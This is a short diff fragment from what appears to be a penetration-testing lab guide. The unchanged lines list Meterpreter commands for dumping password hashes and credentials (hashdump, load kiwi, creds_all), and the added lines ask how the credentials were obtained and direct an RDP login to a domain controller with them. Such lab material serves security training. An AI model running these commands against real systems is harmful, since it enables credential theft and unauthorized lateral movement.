@@ -53,3 +53,7 @@ meterpreter> hashdump<BR>
 meterpreter> load kiwi<BR>
 meterpreter> help<BR>
 meterpreter> creds_all<BR>
+Now that you have the creds, how did you get them? From what insecure package?<BR>
+  
+17. Via RDP, connect to the DC with the new creds for Alice.<BR>
+18. How did you find missing patches before?<BR>
